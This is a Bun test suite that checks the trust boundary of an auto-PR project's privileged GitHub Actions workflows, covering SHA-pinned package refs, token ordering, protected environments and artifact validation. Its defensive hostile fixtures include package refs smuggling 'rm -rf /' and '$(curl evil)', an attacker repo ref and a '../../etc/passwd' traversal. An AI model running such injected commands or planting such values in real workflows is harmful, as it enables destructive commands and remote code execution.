// Trust-boundary regression suite for the auto-PR privileged executor (Task 1.2, RED phase).
//
// WHAT THIS FILE PROVES
// ---------------------
// ADR 0016 (docs/adr/0016-immutable-privileged-workflow-executor.md) records that a
// `push`-triggered workflow cannot be a trust boundary against the pusher: a same-repository
// attacker who pushes an `ai/**` branch supplies the workflow definition, its `permissions:`
// blocks, and (today) the branch-derived package ref `github:knirski/auto-pr#<branch>` that the
// privileged `create` job installs with `bun add` and executes under a `pull-requests: write`
// GitHub App token. These tests parse the workflow/action YAML + shell (they do NOT rely on
// actionlint) and assert the trust properties ADR 0016 requires. They are written to FAIL against
// the current defective workflows and to PASS once Task 1.3 implements the immutable executor.
//
// These tests use Bun's built-in `Bun.YAML.parse` (no new YAML dependency — a prior workstream
// removed `js-yaml` and adding it back would be exactly wrong). Shell bodies inside `run:` steps
// are matched as text/regex, not parsed structurally. Only `.github/workflows/*.yml` is loaded —
// composite-action `.sh` files (e.g. auto-pr-set-pkg.sh) are not read by this suite, since the
// privileged `create` job's logic is entirely inline in `run:` bodies.
//
// SCOPING NOTE (important for green-ability after Task 1.3)
// --------------------------------------------------------
// The bullets about the executor/package/artifact mechanics (no untrusted install target, 40-hex
// SHA pinning, no untrusted install/exec/checkout, checkout absence, token ordering, artifact file
// set, hostile fixtures) are scoped to the *auto-PR privileged phase* — the `create` job of
// `auto-pr-create-reusable.yml` and its caller `auto-pr.yml` — because that is the boundary Task
// 1.3 fixes. Broadening them to "every privileged job in the repo" would flag release tooling
// (release-please, update-dist, update-workflow-pins on push:[main]; add-dist on pull_request; the
// Nix CI credential path — the last is explicitly Task 2.1's scope) and produce permanently-RED
// tests that Task 1.3 cannot turn green. The two bullets that legitimately span every App-secret
// consumer — "protected environment" and "no repository-secret fallback" — are applied repo-wide,
// matching the brief.

import { describe, expect, test } from "bun:test";
import { readdirSync, readFileSync } from "node:fs";
import { join } from "node:path";

const repoRoot = join(import.meta.dir, "..", "..");
const workflowsDir = join(repoRoot, ".github", "workflows");

// The repository default branch (verified in ADR 0016 research finding 7: knirski/auto-pr default
// branch is `main`). A `push` trigger admitting only `main` is a trusted default-branch push; a
// trigger admitting anything else (e.g. `ai/**`) can be driven by an untrusted branch author.
const DEFAULT_BRANCH = "main";

// ---------------------------------------------------------------------------
// Minimal typed YAML helpers (biome: no `any`, no non-null assertions).
// ---------------------------------------------------------------------------

function isRecord(v: unknown): v is Record<string, unknown> {
  return typeof v === "object" && v !== null && !Array.isArray(v);
}

function asString(v: unknown): string | undefined {
  return typeof v === "string" ? v : undefined;
}

function asArray(v: unknown): readonly unknown[] {
  return Array.isArray(v) ? v : [];
}

function parseYaml(text: string): Record<string, unknown> {
  const parsed = Bun.YAML.parse(text);
  if (!isRecord(parsed)) {
    throw new Error("Expected a YAML mapping at the document root");
  }
  return parsed;
}

interface Workflow {
  readonly name: string; // basename, e.g. "auto-pr.yml"
  readonly path: string;
  readonly raw: string;
  readonly doc: Record<string, unknown>;
}

interface JobEntry {
  readonly id: string;
  readonly job: Record<string, unknown>;
}

function loadWorkflows(): readonly Workflow[] {
  const files = readdirSync(workflowsDir).filter((f) => f.endsWith(".yml") || f.endsWith(".yaml"));
  const out: Workflow[] = [];
  for (const name of files) {
    const path = join(workflowsDir, name);
    const raw = readFileSync(path, "utf8");
    out.push({ name, path, raw, doc: parseYaml(raw) });
  }
  return out;
}

const workflows = loadWorkflows();
const workflowsByName = new Map<string, Workflow>(workflows.map((w) => [w.name, w]));

function findWorkflow(name: string): Workflow {
  const wf = workflowsByName.get(name);
  if (wf === undefined) {
    throw new Error(`Expected workflow ${name} to exist`);
  }
  return wf;
}

function getJobs(doc: Record<string, unknown>): readonly JobEntry[] {
  const jobs = doc.jobs;
  if (!isRecord(jobs)) {
    return [];
  }
  const out: JobEntry[] = [];
  for (const [id, job] of Object.entries(jobs)) {
    if (isRecord(job)) {
      out.push({ id, job });
    }
  }
  return out;
}

function findJob(wf: Workflow, id: string): Record<string, unknown> {
  const entry = getJobs(wf.doc).find((j) => j.id === id);
  if (entry === undefined) {
    throw new Error(`Expected job '${id}' in ${wf.name}`);
  }
  return entry.job;
}

function getSteps(job: Record<string, unknown>): readonly Record<string, unknown>[] {
  return asArray(job.steps).filter(isRecord);
}

// ---------------------------------------------------------------------------
// LOAD-BEARING DEFINITION: "privileged job".
//
// For this suite a job is PRIVILEGED if ANY of the following hold:
//   (a) its `permissions` grants `pull-requests: write`; OR
//   (b) any of its steps / env / with values textually reference `secrets.APP_ID` or
//       `secrets.APP_PRIVATE_KEY` (the GitHub App credentials that mint a write-capable token); OR
//   (c) it is a reusable-workflow-calling job (`uses: .../<file>.yml@<ref>`) whose called workflow
//       file (resolved by basename within this repo) contains a job that is itself privileged by
//       (a)/(b)/(c).
//
// This is the definition the whole suite depends on. It is a deliberate over-approximation on the
// side of caution: for a security regression test a false positive (treating a job as privileged
// when it is not) is safe, a false negative (missing a privileged job) is not.
// ---------------------------------------------------------------------------

function jobGrantsPrWrite(job: Record<string, unknown>): boolean {
  const perms = job.permissions;
  return isRecord(perms) && perms["pull-requests"] === "write";
}

function jobReferencesAppSecret(job: Record<string, unknown>): boolean {
  const text = JSON.stringify(job);
  return text.includes("secrets.APP_ID") || text.includes("secrets.APP_PRIVATE_KEY");
}

function reusableWorkflowBasename(job: Record<string, unknown>): string | undefined {
  const uses = asString(job.uses);
  if (uses === undefined) {
    return undefined;
  }
  const match = uses.match(/([^/]+\.ya?ml)(?:@.*)?$/);
  return match?.[1];
}

function isPrivilegedJob(job: Record<string, unknown>, seen: Set<string>): boolean {
  if (jobGrantsPrWrite(job) || jobReferencesAppSecret(job)) {
    return true;
  }
  const basename = reusableWorkflowBasename(job);
  if (basename !== undefined && !seen.has(basename)) {
    seen.add(basename);
    const called = workflowsByName.get(basename);
    if (called !== undefined) {
      return getJobs(called.doc).some((j) => isPrivilegedJob(j.job, seen));
    }
  }
  return false;
}

function privilegedJobsWithContext(): ReadonlyArray<{
  workflow: string;
  id: string;
  job: Record<string, unknown>;
}> {
  const out: Array<{ workflow: string; id: string; job: Record<string, unknown> }> = [];
  for (const wf of workflows) {
    for (const { id, job } of getJobs(wf.doc)) {
      if (isPrivilegedJob(job, new Set())) {
        out.push({ workflow: wf.name, id, job });
      }
    }
  }
  return out;
}

// Collect every string that a job "sinks" a value into: reusable-call `with`, per-step `run`/`env`/
// `with`, and job-level `env`. Used to detect untrusted data flowing into a privileged job.
function jobSinkStrings(job: Record<string, unknown>): readonly string[] {
  const out: string[] = [];
  const collect = (container: unknown): void => {
    if (!isRecord(container)) {
      return;
    }
    for (const v of Object.values(container)) {
      const s = asString(v);
      if (s !== undefined) {
        out.push(s);
      }
    }
  };
  collect(job.with);
  collect(job.env);
  for (const step of getSteps(job)) {
    const run = asString(step.run);
    if (run !== undefined) {
      out.push(run);
    }
    collect(step.env);
    collect(step.with);
  }
  return out;
}

// Expressions that carry untrusted, branch-author-controlled data.
const UNTRUSTED_EXPR =
  /\b(inputs\.[\w-]+|needs\.[\w-]+\.outputs|github\.ref_name|github\.head_ref|github\.event\.workflow_run\.head_branch|steps\.[\w-]+\.outputs)\b/;

// Commands that install or execute a (potentially attacker-selected) package/ref.
const INSTALL_OR_EXEC =
  /\b(bun add|bun install|bun x|bunx|npm i\b|npm install|npx|pnpm add|yarn add)\b/;

const SHA40 = /[a-f0-9]{40}/;

// Auto-PR privileged phase, resolved once (throws if the files/jobs are ever renamed).
const createReusable = findWorkflow("auto-pr-create-reusable.yml");
const createJob = findJob(createReusable, "create");
// Task 1.3b moved the privileged `create` caller out of the (now push-free, unprivileged)
// auto-pr.yml into a separate default-branch, workflow_run-triggered file auto-pr-create.yml
// (ADR 0016 decision 4). The caller `create` job is now looked up there; auto-pr.yml holds only
// the trigger + discover + generate jobs.
const createCaller = findWorkflow("auto-pr-create.yml");
const entryCreateJob = findJob(createCaller, "create");

// Concatenated `run:` step bodies of the create job. We match SHA/guard patterns against THIS,
// never the whole workflow text: the file's `uses: action@<40-hex-sha>` pins would otherwise make
// any "contains a 40-hex SHA" assertion trivially (and wrongly) pass regardless of ref validation.
const createJobRunText = getSteps(createJob)
  .map((s) => asString(s.run))
  .filter((r): r is string => r !== undefined)
  .join("\n");

// ===========================================================================
// Bullet 1 — no privileged job consumes a generate-job output as an install target.
// Task 1.3b outcome: the privileged `create` caller moved to the workflow_run-triggered
// auto-pr-create.yml, which passes through only raw `github.event.workflow_run.*` context (no
// `needs.<generate>.outputs.*`). The generate output `auto_pr_pkg` was removed in Task 1.3a. So
// no privileged job forwards a generate output any more — this bullet flips GREEN. (Its INTENT is
// unchanged; only the file the caller `create` job lives in moved, per ADR 0016 decision 4.)
// ===========================================================================
describe("Bullet 1: privileged job must not consume a generate-job output", () => {
  test("auto-pr-create.yml `create` does not forward needs.<generate>.outputs.* into the privileged call", () => {
    const offending = jobSinkStrings(entryCreateJob).filter((s) =>
      /needs\.[\w-]+\.outputs/.test(s),
    );
    expect(offending).toEqual([]);
  });

  test("no privileged job anywhere sinks auto_pr_pkg derived from a generate output", () => {
    const offenders: string[] = [];
    for (const { workflow, id, job } of privilegedJobsWithContext()) {
      const bad = jobSinkStrings(job).some((s) => /needs\.[\w-]+\.outputs\.auto_pr_pkg/.test(s));
      if (bad) {
        offenders.push(`${workflow}#${id}`);
      }
    }
    expect(offenders).toEqual([]);
  });
});

// ===========================================================================
// Bullet 2 — an executor/package ref a privileged job installs must be an exact 40-hex SHA.
// FRAMING (documented decision): today there is no SHA-pinned executor concept, so a purely
// forward-looking "executor SHA input must be 40-hex" test would be vacuously true. Instead this
// asserts the meaningful property: IF the privileged create phase installs a package ref (it does,
// via `bun add "$AUTO_PR_PKG"`), that ref must be validated to a literal 40-char lowercase hex SHA.
// EXPECTED: FAIL. The current "Validate auto_pr_pkg input" step only checks the string PREFIX
// `github:knirski/auto-pr`; a branch-derived `github:knirski/auto-pr#ai/anything` satisfies it.
// There is no 40-hex SHA validation anywhere in the workflow.
// ===========================================================================
describe("Bullet 2: installed executor ref must be pinned to a 40-hex SHA", () => {
  test("create-reusable installs a package ref but never validates it as a 40-hex SHA", () => {
    const installs = getSteps(createJob).some((step) => {
      const run = asString(step.run);
      return run !== undefined && INSTALL_OR_EXEC.test(run);
    });
    // Precondition: the create phase really does install a ref (otherwise the test is meaningless).
    expect(installs).toBe(true);
    // The defect: no 40-hex SHA shape validation of the installed ref exists in any run: body.
    expect(createJobRunText).toMatch(SHA40);
  });
});

// ===========================================================================
// Bullet 3 — privileged jobs never feed untrusted refs into install/exec/checkout.
// EXPECTED: FAIL. create-reusable's `create` job runs `bun add "$AUTO_PR_PKG"` where AUTO_PR_PKG is
// `${{ inputs.auto_pr_pkg }}` — an untrusted `inputs.*` value flowing into an install command.
// (github.ref_name IS referenced in the create job, but only as EXPECTED_BRANCH for a comparison,
// not as an install/exec target — so this test correctly does not flag that legitimate use.)
// ===========================================================================
describe("Bullet 3: no untrusted ref flows into a privileged install/exec/checkout", () => {
  test("create-reusable `create` install/exec steps consume no untrusted expression", () => {
    const jobEnvStrings = jobSinkStrings({ env: createJob.env });
    const violations: string[] = [];
    for (const step of getSteps(createJob)) {
      const run = asString(step.run);
      const isInstallExec = run !== undefined && INSTALL_OR_EXEC.test(run);
      const usesCheckout = asString(step.uses)?.includes("actions/checkout") === true;
      if (!isInstallExec && !usesCheckout) {
        continue;
      }
      // Expressions reachable by this step: its own env/with + job-level env (bash vars resolve there).
      const reachable = [...jobEnvStrings, ...jobSinkStrings({ env: step.env, with: step.with })];
      for (const expr of reachable) {
        if (UNTRUSTED_EXPR.test(expr)) {
          violations.push(`${asString(step.name) ?? "step"}: ${expr}`);
        }
      }
    }
    expect(violations).toEqual([]);
  });
});

// ===========================================================================
// Bullet 4 — the privileged create job has no checkout of the triggering ref.
// EXPECTED: PASS today. auto-pr-create-reusable's `create` job intentionally has no actions/checkout
// (its comment: "No checkout: workspace has no auto-pr source"). This test locks that in as a
// regression guard so Task 1.3 does not accidentally re-introduce a checkout.
// ===========================================================================
describe("Bullet 4: privileged create job performs no checkout (regression guard, PASS today)", () => {
  test("create-reusable `create` has no actions/checkout step", () => {
    const hasCheckout = getSteps(createJob).some(
      (step) => asString(step.uses)?.includes("actions/checkout") === true,
    );
    expect(hasCheckout).toBe(false);
  });
});

// ===========================================================================
// Bullet 5 — no push trigger admitting an untrusted (non-default) branch reaches a privileged job.
// EXPECTED: FAIL. `auto-pr.yml` is `on: push: branches: [ai/**]` and its `create` job is privileged
// (pull-requests: write + calls the privileged create reusable via secrets: inherit).
// NOTE on scope: release-please / update-dist / update-workflow-pins are push:[main]-only (trusted
// default-branch pushes) so they are correctly NOT flagged. pull_request-triggered privileged
// workflows (add-dist-to-release-pr) are guarded release tooling whose boundary is out of Task 1.3's
// scope, so this bullet intentionally covers push triggers only.
// ===========================================================================
describe("Bullet 5: no untrusted-branch push trigger reaches a privileged job", () => {
  function pushBranchPatterns(doc: Record<string, unknown>): readonly string[] {
    const on = doc.on;
    if (!isRecord(on)) {
      return [];
    }
    const push = on.push;
    if (!isRecord(push)) {
      return [];
    }
    return asArray(push.branches)
      .map(asString)
      .filter((s): s is string => s !== undefined);
  }

  function admitsUntrustedBranch(patterns: readonly string[]): boolean {
    if (patterns.length === 0) {
      return false; // no `push` trigger (or push with no branch filter is handled as no push here)
    }
    return patterns.some((p) => p !== DEFAULT_BRANCH);
  }

  test("no push-triggered workflow that admits a non-default branch contains a privileged job", () => {
    const offenders: string[] = [];
    for (const wf of workflows) {
      if (!admitsUntrustedBranch(pushBranchPatterns(wf.doc))) {
        continue;
      }
      for (const { id, job } of getJobs(wf.doc)) {
        if (isPrivilegedJob(job, new Set())) {
          offenders.push(`${wf.name}#${id}`);
        }
      }
    }
    expect(offenders).toEqual([]);
  });
});

// ===========================================================================
// Bullet 6 — every App-secret-consuming job declares a job-level `environment:`.
// EXPECTED: FAIL for all 6 consumers. Per ADR 0016 decision 8, APP_ID/APP_PRIVATE_KEY move into a
// protected environment (deployment-branch-policy = default branch only) and every consumer must
// name that environment. Today none of them declare `environment:`, so all fail.
// This bullet is applied repo-wide (not just the auto-PR phase), matching the brief.
// ===========================================================================
describe("Bullet 6: every App-secret-consuming job names a protected environment", () => {
  const appSecretJobs: ReadonlyArray<{
    workflow: string;
    id: string;
    job: Record<string, unknown>;
  }> = (() => {
    const out: Array<{ workflow: string; id: string; job: Record<string, unknown> }> = [];
    for (const wf of workflows) {
      for (const { id, job } of getJobs(wf.doc)) {
        if (jobReferencesAppSecret(job)) {
          out.push({ workflow: wf.name, id, job });
        }
      }
    }
    return out;
  })();

  test("the expected set of App-secret-consuming jobs is discovered", () => {
    // Sanity check on the heuristic itself: 5 consumers remain after Task 1.6b.
    // Task 1.6b (fixing the Task 1.6 environment-gate CI regression) dropped
    // add-dist-to-release-pr.yml#add-dist from the App-secret-consumer set: that job is
    // pull_request-triggered, so the main-only `app-credentials` deployment policy would have
    // failed its entire run permanently. It now uses the default GITHUB_TOKEN (job already has
    // contents: write) instead of an App token, removing it as an App-secret consumer entirely.
    // The 5 remaining consumers are: auto-pr-create-reusable.yml#create, release-please.yml#release-please,
    // update-dist.yml#update-dist, update-workflow-pins.yml#update-pins, and nix.yml#bun-nix-push
    // (the privileged push job split out of the former nix.yml#bun-nix).
    expect(appSecretJobs.length).toBe(5);
  });

  test.each(appSecretJobs.map((j) => [`${j.workflow}#${j.id}`, j.job] as const))(
    "%s declares a job-level environment",
    (_label, job) => {
      const env = job.environment;
      const named = asString(env) !== undefined || isRecord(env);
      expect(named).toBe(true);
    },
  );
});

// ===========================================================================
// Bullet 7 — no workflow offers a repository-secret fallback for the App credentials.
// EXPECTED: PASS today (nothing to fix here yet) — this is a regression guard locking in the
// absence of a `secrets.APP_ID/APP_PRIVATE_KEY || <fallback>` pattern, so no future edit can add
// one. DOCUMENTED OBSERVATION: nix.yml has `token: ${{ steps.app-token.outputs.token || github.token }}`
// — a fallback around the App-token OUTPUT (not the secret name). That is a Nix-CI credential
// concern owned by Task 2.1, not the auto-PR boundary, so it is intentionally NOT asserted here.
// ===========================================================================
describe("Bullet 7: no repository-secret fallback for App credentials (regression guard, PASS today)", () => {
  const APP_SECRET_FALLBACK =
    /secrets\.APP_(?:ID|PRIVATE_KEY)\s*\|\||\|\|\s*secrets\.APP_(?:ID|PRIVATE_KEY)/;

  test.each(workflows.map((w) => [w.name, w] as const))(
    "%s has no `secrets.APP_* || ...` fallback",
    (_name, wf) => {
      expect(APP_SECRET_FALLBACK.test(wf.raw)).toBe(false);
    },
  );
});

// ===========================================================================
// Bullet 8 — the App token is generated only AFTER all artifact/identity validation.
// EXPECTED: FAIL. In create-reusable the "Generate GitHub App token" step runs BEFORE the artifact
// branch/default-branch validation, which lives inside the later "Create or update PR" step. The
// privileged token therefore exists before any identity check passes.
// ===========================================================================
describe("Bullet 8: App token generated only after artifact/identity validation", () => {
  test("the create-github-app-token step comes after the artifact-validation step", () => {
    const steps = getSteps(createJob);
    const tokenIdx = steps.findIndex(
      (s) => asString(s.uses)?.includes("actions/create-github-app-token") === true,
    );
    const validationIdx = steps.findIndex((s) => {
      const run = asString(s.run);
      // The identity/artifact validation compares the artifact branch against the workflow ref.
      return run !== undefined && /EXPECTED_BRANCH|EXPECTED_DEFAULT_BRANCH/.test(run);
    });
    expect(tokenIdx).toBeGreaterThanOrEqual(0);
    expect(validationIdx).toBeGreaterThanOrEqual(0);
    expect(tokenIdx).toBeGreaterThan(validationIdx);
  });
});

// ===========================================================================
// Bullet 9 — only title, body, branch, default_branch, head SHA, and a versioned manifest are
// accepted as artifact data, with no dynamic/glob consumption.
// 9a EXPECTED: PASS — the artifact is consumed via explicitly named files, no glob/wildcard/find.
// 9b EXPECTED: FAIL — today's artifact set (title.txt, body.md, branch.txt, default_branch.txt) has
//    no head-SHA file and no versioned manifest. DECISION: fail this now (not merely note it),
//    because ADR 0016 decision 5 requires head_sha validation and the brief explicitly lists "head
//    SHA and a versioned artifact manifest" as required artifact data. Task 1.3 must introduce them.
// ===========================================================================
describe("Bullet 9: artifact data is the exact expected file set", () => {
  test("9a: artifact consumption uses no glob/wildcard/find (regression guard, PASS today)", () => {
    const dynamic = getSteps(createJob).some((step) => {
      const run = asString(step.run);
      if (run === undefined || !run.includes("ARTIFACT_DIR")) {
        return false;
      }
      return /ARTIFACT_DIR"?\/\*|\bfind\b.*ARTIFACT_DIR|ARTIFACT_DIR.*\bfind\b|for\s+\w+\s+in\s+.*ARTIFACT_DIR/.test(
        run,
      );
    });
    expect(dynamic).toBe(false);
  });

  test("9b: artifact set includes a head SHA and a versioned manifest", () => {
    // The producer (generate) and consumer (create) must reference a head-SHA file and a manifest.
    const generate = findWorkflow("auto-pr-generate-reusable.yml");
    const combined = `${createReusable.raw}\n${generate.raw}`;
    const hasHeadSha = /head_sha\.txt|head-sha|workflow_run\.head_sha/.test(combined);
    const hasManifest = /manifest\.json|manifest\.txt|artifact.*version|schema_version/i.test(
      combined,
    );
    expect({ hasHeadSha, hasManifest }).toEqual({ hasHeadSha: true, hasManifest: true });
  });
});

// ===========================================================================
// Bullets 10 & 11 — hostile fixtures + fail-closed assertion.
//
// FRAMING (documented choice): two complementary framings are used, because RED evidence and a
// durable spec are both valuable.
//   (1) SPEC-AS-TEST (PASS): a `evaluateCreateGuard` validator defined IN THIS FILE encodes the
//       fail-closed contract Task 1.3 must implement. Fixture tests assert it accepts the one valid
//       input and rejects every hostile fixture. This is NOT yet wired to the real workflow — it is
//       the executable specification of the required behavior.
//   (2) DEFECT SCANS (FAIL): tests that scan the CURRENT auto-pr-create-reusable.yml shell and prove
//       the fail-closed guards are ABSENT today (no SHA-shape check, no run-id-scoped download, no
//       path-traversal / symlink / size / unexpected-file / head-SHA guards). These demonstrate the
//       workflow does NOT fail closed and turn green when Task 1.3 adds the guards.
// ===========================================================================

const ALLOWED_ARTIFACT_FILES = new Set([
  "title.txt",
  "body.md",
  "branch.txt",
  "default_branch.txt",
  "head_sha.txt",
  "manifest.json",
]);
const MAX_ARTIFACT_BYTES = 1024 * 1024;
const STRICT_SHA40 = /^[a-f0-9]{40}$/;
const TRUSTED_PKG_PREFIX = "github:knirski/auto-pr#";

interface ArtifactEntry {
  readonly name: string;
  readonly bytes: number;
  readonly isSymlink: boolean;
}
interface CreateGuardInput {
  readonly packageRef: string;
  readonly artifact: readonly ArtifactEntry[];
  readonly recordedHeadSha: string; // as carried by the (future) artifact manifest
  readonly currentBranchTipSha: string; // re-resolved at execution time
}
interface GuardResult {
  readonly ok: boolean;
  readonly reason?: string;
}

// Executable specification of the fail-closed contract Task 1.3 must implement.
function evaluateCreateGuard(input: CreateGuardInput): GuardResult {
  const ref = input.packageRef.startsWith(TRUSTED_PKG_PREFIX)
    ? input.packageRef.slice(TRUSTED_PKG_PREFIX.length)
    : input.packageRef;
  if (!STRICT_SHA40.test(ref)) {
    return { ok: false, reason: "package ref is not an immutable 40-hex SHA" };
  }
  if (
    !STRICT_SHA40.test(input.recordedHeadSha) ||
    input.recordedHeadSha !== input.currentBranchTipSha
  ) {
    return { ok: false, reason: "head SHA missing or does not match current branch tip" };
  }
  for (const entry of input.artifact) {
    if (entry.isSymlink) {
      return { ok: false, reason: `symlink artifact entry: ${entry.name}` };
    }
    if (entry.name.includes("..") || entry.name.includes("/") || entry.name.startsWith(".")) {
      return { ok: false, reason: `path traversal / unsafe name: ${entry.name}` };
    }
    if (/[;$`&|<>(){}\s]/.test(entry.name)) {
      return { ok: false, reason: `shell metacharacters in name: ${entry.name}` };
    }
    if (!ALLOWED_ARTIFACT_FILES.has(entry.name)) {
      return { ok: false, reason: `unexpected artifact file: ${entry.name}` };
    }
    if (entry.bytes > MAX_ARTIFACT_BYTES) {
      return { ok: false, reason: `oversized artifact file: ${entry.name}` };
    }
  }
  return { ok: true };
}

describe("Bullets 10-11 (spec-as-test): fail-closed contract Task 1.3 must satisfy", () => {
  const sha = "a".repeat(40);
  const validInput: CreateGuardInput = {
    packageRef: `${TRUSTED_PKG_PREFIX}${sha}`,
    artifact: [
      { name: "title.txt", bytes: 80, isSymlink: false },
      { name: "body.md", bytes: 2000, isSymlink: false },
      { name: "branch.txt", bytes: 20, isSymlink: false },
      { name: "default_branch.txt", bytes: 4, isSymlink: false },
      { name: "head_sha.txt", bytes: 40, isSymlink: false },
      { name: "manifest.json", bytes: 200, isSymlink: false },
    ],
    recordedHeadSha: sha,
    currentBranchTipSha: sha,
  };

  test("accepts a fully valid, SHA-pinned input", () => {
    expect(evaluateCreateGuard(validInput)).toEqual({ ok: true });
  });

  const hostile: ReadonlyArray<readonly [string, CreateGuardInput]> = [
    [
      "shell metacharacters in the package ref",
      { ...validInput, packageRef: `${TRUSTED_PKG_PREFIX}ai/x;rm -rf /` },
    ],
    [
      "command substitution in the package ref",
      { ...validInput, packageRef: `${TRUSTED_PKG_PREFIX}$(curl evil)` },
    ],
    [
      "malicious package ref (attacker repo)",
      { ...validInput, packageRef: "github:attacker/evil#main" },
    ],
    [
      "mutable branch ref instead of a SHA",
      { ...validInput, packageRef: `${TRUSTED_PKG_PREFIX}ai/anything` },
    ],
    [
      "path traversal in an artifact filename",
      {
        ...validInput,
        artifact: [
          ...validInput.artifact,
          { name: "../../etc/passwd", bytes: 10, isSymlink: false },
        ],
      },
    ],
    [
      "symlink artifact entry",
      {
        ...validInput,
        artifact: [...validInput.artifact, { name: "body.md", bytes: 10, isSymlink: true }],
      },
    ],
    [
      "oversized artifact file",
      {
        ...validInput,
        artifact: [{ name: "body.md", bytes: MAX_ARTIFACT_BYTES + 1, isSymlink: false }],
      },
    ],
    [
      "unexpected/extra artifact file",
      {
        ...validInput,
        artifact: [...validInput.artifact, { name: "postinstall.sh", bytes: 10, isSymlink: false }],
      },
    ],
    [
      "mismatched run/head SHA (force-push race)",
      { ...validInput, currentBranchTipSha: "b".repeat(40) },
    ],
  ];

  test.each(hostile)("fails closed for: %s", (_label, input) => {
    expect(evaluateCreateGuard(input).ok).toBe(false);
  });
});

describe("Bullets 10-11 (defect scan): current workflow does NOT fail closed", () => {
  test("no run-id scoping on artifact download (ADR 0016 decision 5)", () => {
    const download = getSteps(createJob).find(
      (s) => asString(s.uses)?.includes("actions/download-artifact") === true,
    );
    expect(download).toBeDefined();
    if (download === undefined) {
      return;
    }
    const withBlock = download.with;
    const hasRunId = isRecord(withBlock) && "run-id" in withBlock;
    expect(hasRunId).toBe(true);
  });

  test("no 40-hex SHA validation of the installed package ref", () => {
    // Same defect as bullet 2, framed as "malicious package ref is not rejected".
    expect(createJobRunText).toMatch(SHA40);
  });

  test("no head-SHA identity validation", () => {
    expect(/head_sha|head\.sha|HEAD_SHA/.test(createJobRunText)).toBe(true);
  });

  test("artifact handling has no path-traversal / symlink / size guards", () => {
    const artifactSteps = getSteps(createJob)
      .map((s) => asString(s.run))
      .filter((r): r is string => r !== undefined)
      .filter((r) => r.includes("ARTIFACT_DIR"));
    const combined = artifactSteps.join("\n");
    const hasGuard = /\.\.|readlink|-L\s|\bstat\b|wc -c|realpath/.test(combined);
    expect(hasGuard).toBe(true);
  });
});
